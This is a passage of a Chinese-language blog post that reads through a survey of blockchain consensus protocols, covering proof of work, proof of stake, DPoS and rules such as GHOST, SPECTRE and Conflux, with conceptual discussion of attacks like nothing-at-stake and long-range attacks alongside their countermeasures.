<blockquote>
<p>按节点准入机制,区块链系统分为<strong>非许可链(permissionless blockchain)</strong> 和<strong>许可链(permissioned blockchain)</strong> 两类[34,35].非许可链系统中没有许可机构对节点进行身份审查,节点以匿名形式任意加入或退出系统,因此非许可链又被称为公开链(public blockchain).基于这种开放性质,非许可链系统规模通常较大,共识节点甚至可达上万[36,37].许可链系统中节点需经过中心机构的准入审查,获得授权后才能加入系统.因而,许可链系统规模往往较小,节点数通常为几十到几百[16,38].针对不同应用场景,许可链又分为联盟链(consortium blockchain)和私有链(private blockchain)[34,39].联盟链通常由具有相同行业背景的多家不同机构组成,共识节点来自联盟内各个机构,区块链数据在联盟机构内部共享.私有链通常部署在单个机构内部,共识节点来自机构内部,类似于传统的分布式数据集群.由于区块链共识协议的相关研究主要针对非许可链,因此我们在本文中主要分析非许可链共识协议,同时也包括一些典型的许可链共识协议.</p>
</blockquote>
<p>按节点准入机制，区块链系统分为：</p>
<ul>
<li><strong>非许可链系统(permissionless blockchain)</strong> ，没有许可机构对节点进行身份审查，节点以匿名形式任意加入或退出系统，因此非许可链又被称为<strong>公开链(public blockchain)</strong> 。</li>
<li><strong>许可链系统(permissioned blockchain)</strong> ，节点需经过中心机构的准入审查，获得授权后才能加入系统。许可链系统规模往往较小，节点数通常为几十到几百。许可链又分为：<ul>
<li><strong>联盟链(consortium blockchain)</strong> ，通常由具有相同行业背景的多家不同机构组成，共识节点来自联盟内各个机构，区块链数据在联盟机构内部共享。</li>
<li><strong>私有链(private blockchain)</strong> ，通常部署在单个机构内部，共识节点来自机构内部，类似于传统的分布式数据集群（其实就是分布式数据库）。</li>
</ul>
</li>
</ul>
<p>区块链共识协议的相关研究主要针对非许可链，论文也主要分析非许可链共识协议。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image.png" alt="1"></p>
<h2 id="2-出块节点选举机制"><a href="#2-出块节点选举机制" class="headerlink" title="2 出块节点选举机制"></a>2 出块节点选举机制</h2><h3 id="2-1-工作量证明机制"><a href="#2-1-工作量证明机制" class="headerlink" title="2.1 工作量证明机制"></a>2.1 工作量证明机制</h3><blockquote>
<p>比特币[2]首次使用工作量证明(proof of work,简称 PoW)机制进行出块节点选举,随后的大量区块链研究工作及系统都采用这一机制.<strong>工作量证明的概念最早由 Jakobsson 等人在 1999 年提出[46],用于实现可验证的计算任务</strong> .</p>
</blockquote>
<p>比特币<strong>基于难题形式</strong> 实现工作量证明机制。给定全网统一的难度值 D、区块元数据 blockData，寻找满足条件的Nonce值,使得根据哈希函数 SHA-256 计算得到的区块哈希 blockHash 低于目标难度值 D:</p>
<p>$$<br>blockHash&#x3D;Hash(blockData,Nonce)≤D<br>$$</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_1.png" alt="1"></p>
<h4 id="2-1-1-算力中心化"><a href="#2-1-1-算力中心化" class="headerlink" title="2.1.1 算力中心化"></a>2.1.1 算力中心化</h4><p>背景：</p>
<blockquote>
<p>在中本聪的设想中,节点使用个人电脑即可进行 PoW 运算,参与出块节点选举,并获得相应报酬.然而,随着比特币价格的上涨,出块节点获得的区块奖励吸引了大量算力加入,比特币网络中的哈希算力呈指数级增长趋势[64].共识节点参与 PoW 运算的物理设备从早期的个人电脑转换为 GPU,再演变为目前广泛使用的专用集成电路(application-specific integrated circuits,简称 ASIC)矿机.</p>
</blockquote>
<p>问题：</p>
<blockquote>
<p>矿池管理员将计算子任务下发给矿工,子任务难度值 d 远低于全网统一难度值 D.矿工找到子任务难题解后,提交给矿池.由于部分子任务难题解也是定义 1 中比特币 PoW 难题解,矿池将获得区块奖励,并根据矿工根据提交的子任务解的数量分配报酬.矿池子任务难题的设计保证矿工收入的稳定性.截止 2019 年 7 月 9 日,占比第一的BTC.com矿池拥有 21.9%的算力,前两大矿池拥有 33.9%的算力.<strong>算力中心化会带来一系列的安全问题[65−67],例如发动双花攻击、自私挖矿攻击等.</strong></p>
</blockquote>
<p>解决措施：</p>
<ul>
<li>替换 SHA-256 哈希函数</li>
</ul>
<blockquote>
<p>针对 SHA-256 哈希函数计算密集型的特点,一些区块链系统选择用内存密集型哈希函数替代原有函数.例如,莱特币(Litecoin)[18]和狗狗币(Dogecoin)[53]采用 Scrypt 算法[68],以太坊[17]采用 Ethash 算法[69],大零币(ZeroCash)[54]和小零币(ZeroCoin)[55]采用 Equihash 算法[70].内存密集型哈希函数由于计算时占用内存多、难以并行计算,能在一定程度上降低 ASIC 矿机的算力优势.</p>
</blockquote>
<ul>
<li>设计外包困难的 PoW 难题</li>
</ul>
<blockquote>
<p>针对比特币 PoW难题可外包的特点,研究人员修改难题形式使其外包困难,达到区块链系统去中心化的目标.例如,文献[56]重新设计比特币 PoW 难题,使矿池管理者将计算任务分发给矿工后,矿工可修改计算任务中获取奖励的地址,并不被矿池管理者发现.</p>
</blockquote>
<ul>
<li>去中心化矿池</li>
</ul>
<blockquote>
<p>文献[57]实现了基于智能合约的去中心化矿池 SmartPool,矿池可自动执行子任务难题分发与确认工作,替代矿池管理员,矿工在获得稳定收入的前提下,共同维护 SmartPool,从而保持算力的去中心化.</p>
</blockquote>
<h4 id="2-1-2-资源浪费"><a href="#2-1-2-资源浪费" class="headerlink" title="2.1.2 资源浪费"></a>2.1.2 资源浪费</h4><p>问题：</p>
<blockquote>
<p>截至 2019 年 7 月,哈希率达到 70EH&#x2F;s(百亿亿次哈希&#x2F;秒).现有文献[71]估计,比特币网络年用电量与爱尔兰或奥地利年用电量相当.</p>
</blockquote>
<p>解决措施：</p>
<ul>
<li>提供有用服务</li>
</ul>
<blockquote>
<p>一些区块链系统利用 PoW 计算过程中消耗的算力提供有用服务.例如,素数币(Primecoin)[58]将PoW 难题改进为寻找符合要求的素数,供公众使用,进而促进数学领域发展</p>
</blockquote>
<ul>
<li>利用其他特定能力证明</li>
</ul>
<blockquote>
<p>如<strong>权益证明(proof of stake,简称PoS)</strong> [24,44,50,72,73]、空间证明(proof of space,简称 PoSp,又被称为容量证明(proof of capacity,简称 PoC)、存储证明(proof of storage,简称 PoSt)[61]、权威证明(proof of authority,简称 PoAu)[62]、信誉证明(proof of reputation,简称PoR)[63]替代工作量证明.这些特定能力证明中,节点成为出块节点的概率分别与其拥有的某种稀缺资源相关,如权益(即加密货币数量)、内存或硬盘存储空间、权威、信誉相关,与算力无关.例如,文献[61]的空间证明用内存消耗型难题替代 PoW 算力难题.PoAu 与 PoR 思想类似,只有具有较高权威或信誉度的节点才能成为出块节点,由于区块带有节点签名,节点被检测到作恶后会丧失出块资格.因此,PoAu 与 PoR 只能用于具有准入机制的许可链系统中,无法用于非许可链系统.</p>
</blockquote>
<h4 id="2-1-3-性能"><a href="#2-1-3-性能" class="headerlink" title="2.1.3 性能"></a>2.1.3 性能</h4><p>问题：</p>
<blockquote>
<p>随着比特币系统关注度上升,网络中未确认交易数增多.截至 2019 年 7 月 10 日,比特币网络存在近 5 万笔未确认交易[74].</p>
</blockquote>
<p>解决措施：</p>
<ul>
<li>修改参数</li>
</ul>
<blockquote>
<p>例如,以太坊、莱特币、狗狗币系统分别将比特币 PoW 机制中的区块间隔调整为 15s、2.5min 和 1min[75],以此加速交易处理速度.缩短区块间隔看起来是改善性能的可行方案,然而一些研究工作发现,缩短区块间隔存在安全隐患.文献[11−13]指出:<strong>足够长的区块间隔保证区块数据在 P2P 网络中广泛传播,区块间隔缩短会削弱系统安全性</strong> .例如,当攻击者掌握 30%系统算力时,为了达到和比特币系统同等程度的安全性,以太坊、莱特币、狗狗币系统需要分别等待至少 37 个、28 个、47 个区块长度确认[75].</p>
</blockquote>
<ul>
<li>修改比特币的出块节点选举机制</li>
</ul>
<blockquote>
<p>Bitcoin-NG 将区块分为关键块(key block)和微块(micro block)两类:关键块包含比特币 PoW 难题的解,体现出块节点的工作量证明;微块包含关键块对应的出块节点签名,但不包含难题的解,不体现工作量证明.节点生成关键块后,负责在随后的区块间隔时间内将交易打包进微块并签名.通过验证节点签名,其他节点判断微块的合法性.通过在区块间隔连续产生微块,Bitcoin-NG 实现了在出块节点选举环节加速交易处理.关键块和微块的概念随后也在 Byzcoin[15]中得到应用.</p>
</blockquote>
<h4 id="2-1-4-总结"><a href="#2-1-4-总结" class="headerlink" title="2.1.4 总结"></a>2.1.4 总结</h4><p>可行的研究点：</p>
<blockquote>
<p>首先,工作量证明改进工作多以白皮书的形式提出,<strong>缺乏理论及实验数据支撑</strong> .例如,以太坊系统等白皮书大多从概念层面进行论述,没有相关实验数据支撑,也没有进行安全性证明.</p>
</blockquote>
<blockquote>
<p>其次,众多的工作量证明<strong>改进机制之间缺乏相互比较</strong> ,无法判读其优劣势.例如,包括 Scrypt[68]、Ethash[69]、Equihash[70]在内的众多内存密集型哈希函数没有相互比较,尚不清楚这些算法针对算力中心化问题的改进程度.值得注意的是,目前已出现针对以上内存密集型哈希函数的专用矿机.</p>
</blockquote>
<blockquote>
<p>再者,由于分布式系统的各方面复杂因素,<strong>对协议进行参数调整需要加以严格的安全证明</strong> .例如,莱特币等调整参数的改进方案看似可行,但被证明存在安全隐患[13],最终没能达到预期效果.</p>
</blockquote>
<h3 id="2-2-权益证明机制"><a href="#2-2-权益证明机制" class="headerlink" title="2.2 权益证明机制"></a>2.2 权益证明机制</h3><p>背景：</p>
<blockquote>
<p>针对工作量证明机制的资源浪费问题,比特币社区[76]在 2011 年首次提出了权益证明机制,根据节点掌握的比特币数量而不是算力作为权重选举出块节点.<strong>权益证明机制的安全性基于权益拥有者比矿工更有动力维护网络安全的假设</strong> [44,72,76],当区块链系统遭到攻击,权益拥有者自身利益更容易受损.2012年,权益证明机制首次在点点币(peercoin&#x2F;ppcoin)[44]系统中得到应用.</p>
</blockquote>
<p>定义：</p>
<blockquote>
<p>给定全网统一的难度值 D,区块元数据 blockData,寻找满足条件的时间戳timeStamp,使根据哈希函数 SHA-256 计算得到的区块哈希 blockHash 低于目标难度值.目标难度值为全网统一难度值 D 和币龄 coinDay 的乘积.币龄是节点持有权益(即节点持有的数字货币数量,coin)与持有时间(day)的乘积:</p>
</blockquote>
<p>$$<br>blockHash&#x3D;Hash(blockData,timeStamp)≤D×coinDay<br>$$</p>
<p>与工作量证明的不同：</p>
<ul>
<li>移除随机数 Nonce，缩小计算尝试空间</li>
</ul>
<blockquote>
<p>由于移除随机数 Nonce,点点币权益证明难题减轻了工作量证明难题算力竞争问题.在给定元数据 blockData 的情况下,共识节点在求解点点币权益证明难题中,可尝试的只有时间戳变量.由于点点币采用以秒计数的 UNIX 时间戳,节点求解难题时尝试空间有限.因此,点点币权益证明难题大大缩小了工作量证明难题的计算尝试空间,减缓了算力竞赛带来的资源浪费问题.</p>
</blockquote>
<ul>
<li>引入币龄调整难题难度</li>
</ul>
<blockquote>
<p>以币龄作为权重,实现根据权益选举出块节点的目标,币龄的概念随后在披风币(Cloakcoin)[77]和新星币(Novacoin)[78]中也得到应用.币龄是用户权益和持有时间的乘积.假设用户 A 拥有 10 个点点币并持有 90 天,累计 900 币龄.用户 B 拥有 10 个点点币并持有 45 天,累计 450 币龄.根据点点币权益证明难题,用户 A 解决难题的可能性 2 倍于用户 B.</p>
</blockquote>
<p>不足：</p>
<blockquote>
<p>不活跃节点可能通过长期持有权益累积大量币龄,提高自己成为出块节点的可能性,从而等待发动攻击的时机.针对这一问题,未来币[45]和黑币[79]在权益证明难题中以权益替代币龄,维理币[80]使用类似币龄的权益时间(stakeTime)概念,节点离线后权益时间会逐渐减少,活动证明(proof of activity,简称PoA)[50]将权益证明与工作量证明结合,使得只有在线的活跃节点才能获得挖矿收益和交易费.这几种方法都用于改进点点币系统中不活跃节点问题.</p>
</blockquote>
<h4 id="2-2-1-基于随机函数的权益证明"><a href="#2-2-1-基于随机函数的权益证明" class="headerlink" title="2.2.1 基于随机函数的权益证明"></a>2.2.1 基于随机函数的权益证明</h4><p>问题：</p>
<blockquote>
<p>权益证明机制在一定程度上缓和了工作量证明机制的算力浪费问题,但采用的仍是基于难题求解的竞争性选举机制.</p>
</blockquote>
<p>基于随机函数的权益证明机制：</p>
<blockquote>
<p>这类机制采用以权益作为权重的随机算法确定出块节点,同时,其他节点可通过随机算法验证出块节点身份的正确性.由于不再利用算力竞争成为出块节点,基于随机函数的权益证明属于非竞争性选举机制.</p>
</blockquote>
<p>follow-the-satoshi算法：</p>
<blockquote>
<p>聪(satoshi)是比特币的最小货币单位,follow-the-satoshi 算法将零和比特币发行总量(以聪为单位)间的一个随机数作为输入,通过追溯区块数据,找到目前持有该货币的节点,该节点即成为出块节点.假设用户 A持有 10 个比特币,用户 B 持有 5 个比特币,用户 A 被 follow-the-satoshi 算法选中的概率 2 倍于用户 B.因此,follow-the-satoshi 算法实现根据权益进行出块节点选举.</p>
</blockquote>
<p>相关例子（活动证明、活动链和Ouroboros都利用 follow-the-satoshi 算法随机选举出块节点，但采用不同方式更新 follow-the-satoshi 算法的随机种子）：</p>
<ul>
<li>活动证明(PoA)</li>
</ul>
<blockquote>
<p>PoA[50]中,出块节点首先需要生成满足 PoW 的空区块(不包含交易,只包含区块元数据的空区块)哈希,将该哈希作为随机算法输入,选出一组背书节点.出块节点搜集一定数量背书节点签名后才能打包交易、生成合法区块.因此,PoA[50]的出块节点选举机制实质是 PoW 和 PoS 的结合,PoW区块哈希的不可预测保证了 PoS 选举结果的不可预测.</p>
</blockquote>
<ul>
<li>活动链(chains of activity,简称 CoA)</li>
</ul>
<blockquote>
<p>CoA[72]将当前区块的前 N 个区块哈希作为随机算法输入,选出后 N 个区块的出块节点.</p>
</blockquote>
<ul>
<li>Ouroboros</li>
</ul>
<blockquote>
<p>Ouroboros[24]基于安全多方计算(multi-party computation,简称 MPC)更新随机种子.Ouroboros 将多个区块间隔称为一个纪元(epoch),纪元内的出块节点共同组成组委员(committee),组委会节点参与 MPC 算法,合作更新随机种子.</p>
</blockquote>
<ul>
<li>Algorand</li>
</ul>
<blockquote>
<p>Algorand[14]基于<strong>可验证随机函数(verifiable random function,简称 VRF)</strong> 进行出块节点选举,各节点利用自己的私钥和全网统一的随机种子作为算法输入,判断自己是否是本轮的出块节点.若成为出块节点,节点将同时出示算法生成的选举证明,供其他节点验证.前一区块间隔的出块节点利用VRF 函数更新下一间隔的随机种子.</p>
</blockquote>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_2.png" alt="1"></p>
<h4 id="2-2-2-问题及解决方案"><a href="#2-2-2-问题及解决方案" class="headerlink" title="2.2.2 问题及解决方案"></a>2.2.2 问题及解决方案</h4><p>PoS虽然解决了算力浪费问题，但也存在一些问题：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_3.png" alt="1"></p>
<ul>
<li><p>粉碎攻击(grinding attack)</p>
<ul>
<li><p>描述</p>
<blockquote>
<p>粉碎攻击(grinding attack)指节点通过尝试随机参数提高成为出块节点概率的一类攻击形式.例如,攻击者通过尝试点点币权益证明难题中的时间戳(timeStamp)和拥有的多个账户币龄提高成为出块节点概率[60].与点点币类似,未来币中也有时间戳尝试和公钥尝试问题.除此以外,基于随机函数的权益证明可提前尝试随机种子,提高随后被选中为出块节点的概率[24,50,60].由于随机种子基于以前的区块哈希,CoA[72]可能会遭到粉碎攻击[24].</p>
</blockquote>
</li>
<li><p>解决方案</p>
<blockquote>
<p>主要包括参数不可尝试以及随机种子限制:前者指权益证明难题中不包括可尝试参数;后者指随机种子尽量不依赖区块本身信息,否则存在随机算法偏向某一节点的可能.例如,Ouroboros[24]和Ouroboros Praos[82]利用多方安全计算产生随机算法种子,既解决了可尝试参数问题,同时保证随机性与区块信息无关.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>无权益攻击(nothing-at-stake)</p>
<ul>
<li>描述<blockquote>
<p>无权益攻击(nothing-at-stake)指被选中的出块节点在同一高度产生多个区块,导致区块分叉无法解决的问题.无权益攻击是出块节点出于利益最大化作出的选择.如图 2 所示,基于权益证明的区块链系统在高度 h 处出现分叉,节点 A 是高度 h+1 的出块节点,由于尚不确定在高度 h 上被最终确认的区块,节点 A 选择同时在多个分叉块后产生区块.因此,无论最终哪一区块是合法区块,节点 A 都可获利.</p>
</blockquote>
</li>
</ul>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_4.png" alt="1"></p>
<ul>
<li>解决方案<blockquote>
<p>主要包括保证金制度和安全硬件.<strong>保证金制度</strong> 指共识节点需在账户中存取一定金额保证金,若节点被监测发动无权益攻击,则罚没其保证金,从经济激励角度解决无权益攻击.例如,以太坊的 PoS 提案 Slasher[83]和 Casper[84]都引入了保证金制度.类似地,Tendermint[85]也引入了保证金机制,且保证金比例和共识票数成正比.除此以外,文献[86]基于可信执行环境(trusted execution environment,简称TEE)的安全硬件,限制节点在同一高度只能生成一个区块.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>长程攻击(long range)</p>
<ul>
<li><p>描述</p>
<blockquote>
<p>长程攻击(long range)指攻击者试图从某一高度区块后重新生成后续所有区块,覆盖这一区间区块数据,也被称为历史攻击(history attack).由于长程攻击要求攻击者的区块生成速度快于其他节点,因此理论上只有掌握超过 50%权益的攻击者才能发动长程攻击,然而实际上,攻击者可通过控制或贿赂历史时刻拥有大量权益的节点[86]发动长程攻击.例如,攻击者 A 拥有 21%的权益,节点 B 在某一历史时刻拥有 30%的权益,随后将 30%权益转让他人,攻击者可通过控制或贿赂的手段,利用节点 B 在历史时刻拥有的权益,从该时刻重新生成区块.</p>
</blockquote>
</li>
<li><p>解决方案：</p>
<blockquote>
<p>主要包括移动检查点机制和密钥演进加密技术.移动检查点机制[87]将某一历史高度的区块作为检查点,检查点前的区块不可篡改.移动检查点机制在点点币[44]、未来币[45]、黑币[79]、snowwhite[88]中得到使用.点点币和黑币依赖中心服务器定期发布检查点.未来币[45]不接受 720 个区块以前的历史区块分叉.与未来币类似,snow white[88]不接受对距离当前区块太远的历史区块分叉.除了检查点机制以外,Ouroboros Praos[82]采用密钥演进加密技术解决长程攻击[87].节点随着时间需要不断演变私钥,当攻击者盗取了节点目前的密钥时,由于不能伪造过去的签名,无法利用节点的历史权益发送长程攻击.</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>委托权益证明(delegated proof of stake,简称 DPoS)：</p>
<blockquote>
<p>委托权益证明(delegated proof of stake,简称 DPoS)[89]通过投票机制缩小共识节点范围,使 PoS 在大规模网络中得以高效应用.DPoS 中的票数与权益成正比,权益所有者投票选出一部分节点作为候选出块节点,这些节点再利用 PoS 的随机算法成为出块节点.节点若在给定时间段内未完成出块,将被移出候选出块节点列表.因此,持有权益较少的节点可通过投票维护系统安全,而不必购买专业硬件设备成为共识节点.投票机制还可用于权益所有者修改系统参数,包括交易大小、区块间隔、交易费规则等,实现了区块链系统自治.</p>
</blockquote>
<h4 id="2-2-3-总结"><a href="#2-2-3-总结" class="headerlink" title="2.2.3 总结"></a>2.2.3 总结</h4><blockquote>
<p>权益证明机制由早期基于难题的竞争性机制,逐渐演变为<strong>基于随机函数的非竞争性出块节点选举机制</strong> .后者由于安全且高效,<strong>是目前权益证明共识协议的重点研究方向</strong> .我们在调研过程中发现,尽管研究成果众多,<strong>目前尚没有权益证明机制及其安全问题的综述研究</strong> .因此,本文对权益证明及其 3 种主要攻击方法和对应解决方案进行总结.此外,相比工作量证明机制,<strong>采用权益证明机制的区块链系统仍较少</strong> .再者,一些区块链系统采用工作量证明和权益证明结合的方式,前期利用工作量证明完成权益的初始分配,再逐渐过渡到权益证明机制,例如以太坊、点点币等.但是,<strong>目前尚没有关于工作量证明如何安全过渡到权益证明的相关研究</strong> .</p>
</blockquote>
<h2 id="3-主链共识"><a href="#3-主链共识" class="headerlink" title="3 主链共识"></a>3 主链共识</h2><p>根据区块数据是否满足最终一致性，主链共识可分为：</p>
<ul>
<li>概率性共识</li>
</ul>
<blockquote>
<p>区块数据以一定概率达成一致,随着时间推移概率逐渐提高,不能保证区块数据将来不可更改,这种一致性也称为弱一致性.</p>
</blockquote>
<ul>
<li>确定性共识</li>
</ul>
<blockquote>
<p>一旦区块数据达成一致便不可更改,又被称为强一致性.</p>
</blockquote>
<h3 id="3-1-概率性共识"><a href="#3-1-概率性共识" class="headerlink" title="3.1 概率性共识"></a>3.1 概率性共识</h3><p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_5.png" alt="1"></p>
<h4 id="3-1-1-最长链规则"><a href="#3-1-1-最长链规则" class="headerlink" title="3.1.1 最长链规则"></a>3.1.1 最长链规则</h4><blockquote>
<p>最长链规则在比特币白皮书[2]中首次提出</p>
</blockquote>
<blockquote>
<p>最长链规则是目前应用最广泛的主链选取规则</p>
</blockquote>
<h4 id="3-1-2-GHOST规则"><a href="#3-1-2-GHOST规则" class="headerlink" title="3.1.2 GHOST规则"></a>3.1.2 GHOST规则</h4><p>背景：</p>
<blockquote>
<p>文献[12]发现,在交易请求增多时,比特币不得不频繁地创建大区块以提高交易吞吐量.大区块将导致区块传输时间延长,使得分叉块增多、诚实节点算力分散,此时,恶意节点将更容易发动攻击.</p>
</blockquote>
<p>当分叉块增多、诚实节点算力分散时，会出现如下安全问题：</p>
<blockquote>
<p>攻击者秘密生成一条私有区块链(黑色链条),当私有区块链长度超过网络中公开的最长链时将其发布,根据最长链规则,攻击者的私有区块链将成为主链.攻击者可通过私有区块链发动双花攻击,从而破坏区块链系统安全性.</p>
</blockquote>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_6.png" alt="1"></p>
<blockquote>
<p>为了在交易请求增多时依然保证较高安全性,Sompolinsky 等人提出了 GHOST(greedy heaviest-observed sub-tree)[12]规则作为最长链规则的替代.</p>
</blockquote>
<blockquote>
<p>与最长链不同,<strong>GHOST 规则将分叉块纳入主链选取规则,区块树中最重子树的区块将构成主链,又被称为最重链</strong> .由于最重链代表网络中的大部分算力,文献[12]认为:只要诚实节点掌握大多数算力,GHOST 规则在网络交易吞吐量高的情况下也能保证安全性.</p>
</blockquote>
<p><strong>GHOST(greedy heaviest-observed sub-tree)规则，每当遇到分叉时就选择最重子树（区块最多的分叉子树），直到选出最长链</strong> 。如上图中，最终选择中间虚线链条为最长链。</p>
<p>应用：</p>
<blockquote>
<p>GHOST 规则随后在包容性协议[26]和 Conflux 中用来选择主链,但据我们所知,该规则目前并未直接应用于非许可链系统中(我们注意到:以太坊声称使用 GHOST规则来选取主链,并实现了一个GHOST的简化版本[12],但项目代码[92]显示,目前采用的仍是最长链规则).</p>
</blockquote>
<p>性能对比：</p>
<blockquote>
<p>文献[12]在相同实验条件下对比了 GHOST 与最长链规则的性能,实验结果显示:在不同参数设置中,GHOST 的吞吐量都略低于最长链规则,但其在处理高吞吐量交易时拥有更高安全性能.</p>
</blockquote>
<h4 id="3-1-3-包容性协议"><a href="#3-1-3-包容性协议" class="headerlink" title="3.1.3 包容性协议"></a>3.1.3 包容性协议</h4><blockquote>
<p>包容性协议[26]<strong>将 GHOST 规则与有向无环图(directed acyclic graph,简称 DAG)结合</strong> ,进一步提高交易吞吐量.包容性协议修改了以比特币为代表的传统区块链数据结构,<strong>区块可以指向多个父区块而不是唯一一个,新区块将所有没有被指向的区块(即叶子区块)作为父区块</strong> ,因此,包容性协议中区块构成了有向无环图而不是区块树.基于该有向无环图,<strong>包容性协议首先利用 GHOST 规则选出主链,遍历主链区块的多个分叉父区块,如果分叉块中的交易和主链交易没有冲突,则将分叉块也纳入主链中.</strong> 通过利用分叉块交易内容,包容性协议进一步提升交易通量,并且对于网络连接差、不能及时广播区块的节点更加友好.</p>
</blockquote>
<h4 id="3-1-4-SPECTRE协议"><a href="#3-1-4-SPECTRE协议" class="headerlink" title="3.1.4 SPECTRE协议"></a>3.1.4 SPECTRE协议</h4><blockquote>
<p>SPECTRE[51]协议<strong>利用成对投票(pair voting)解决冲突区块问题</strong> ,提高系统吞吐量并保证安全性.与包容性协议类似,SPECTRE 中新区块指向多个父区块,形成有向无环图,在此基础上运行投票规则.</p>
</blockquote>
<p>假设区块x和y是一对包容冲突交易的区块，z区块将对冲突区块进行投票，投票规则如下：</p>
<ol>
<li>z 是 x 的后代区块,不是 y 的后代区块,z 投票给 x,表示为 x≤y.</li>
<li>z 同时是 x 和 y 的后代区块,则根据本区块之前有向无环图的区块投票结果确定.如果投票数量相等,则根据预定义规则决定(区块哈希的字典顺序等).</li>
<li>z 既不是 x 的后代区块,也不是 y 的后代区块,则根据本区块之后有向无环图的区块投票结果确定.如果投票数量相等,则根据预定义规则决定.</li>
</ol>
<p>示例如下，交易x是攻击者支付的正确交易，交易y是恶意交易。攻击者先广播交易x，交易x被确认之后，再公布隐藏链，企图代替主链。但根据SPECTRE协议，区块6<del>10肯定投票给x；区块11</del>12由于前置区块投给x的票数大于投给y的，也投给x；区块2~5由于后接区块投给x的票数更多，也投给x；最终交易x胜出。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_7.png" alt="1"></p>
<h4 id="3-1-5-Conflux协议"><a href="#3-1-5-Conflux协议" class="headerlink" title="3.1.5 Conflux协议"></a>3.1.5 Conflux协议</h4><blockquote>
<p>Conflux[25]协议<strong>基于有向无环图计算出区块内交易的全局顺序,通过剔除冲突交易,使所有分叉块内的交易得到利用</strong> ,从而提升系统吞吐量.Conflux 的区块间有两类指向关系:父边(parent edge)和引用边(reference edge).父边指向父区块,每个区块只有一条父边.除父边外,区块可以有多条引用边,引用边指向所有目前没有被父边引用的叶子区块,引用边代表时间上的发生在先(happen-before)关系.<strong>Conflux利用 GHOST规则选出有向无环图中的主链,利用主链和两类指向关系对所有区块进行全局排序.基于区块的全局排序,区块内的交易也达成全局排序.随后,Conflux 从交易全局排序中剔除掉重复和冲突的交易,对余下交易达成共识.</strong></p>
</blockquote>
<h4 id="3-1-6-安全分析"><a href="#3-1-6-安全分析" class="headerlink" title="3.1.6 安全分析"></a>3.1.6 安全分析</h4><p>主要围绕以下两方面进行安全性分析：</p>
<ul>
<li>持久性(persistence)</li>
</ul>
<blockquote>
<p>持久性衡量概率性共识中区块链数据的一致性.持久性指如果某区块在节点的本地区块链中拥有 k 个区块的深度,该区块在其他节点的本地区块链中(极大概率)也拥有 k 个区块的深度.由于网络传播等限制,各个节点的本地区块链可能暂时不一致,但 k 个区块之前的数据(极大概率)是一致的.</p>
</blockquote>
<ul>
<li>活性(liveness)</li>
</ul>
<blockquote>
<p>活性衡量概率性共识中区块链系统的可用性.活性指诚实节点发起的交易最终被打包进节点区块链中,并满足持久性.由于网络吞吐量等限制,诚实节点发起的交易可能不会立即被处理,但最终会被处理.</p>
</blockquote>
<p>各概率性共识协议的分析（都需要在诚实节点掌握大多数算力情况下）：</p>
<ul>
<li>最长链规则</li>
</ul>
<blockquote>
<p>在同步和异步网络中都满足持久性和活性要求.比特币白皮书[2]对基于工作量证明的最长链规则首先进行了非正式分析,在网络同步且诚实节点掌握大多数算力时,协议满足持久性要求.随后,文献[13]对最长链规则进行了理论证明,在网络同步且诚实节点拥有大多数算力的情况下,最长链规则满足持久性和活性要求.在此基础上,文献[96]证明了最长链规则在延迟时间有上界的异步网络中,且诚实节点拥有大多数算力的情况下,满足持久性和活性要求,并可以适应算力动态变化.</p>
</blockquote>
<ul>
<li>GHOST与Conflux</li>
</ul>
<blockquote>
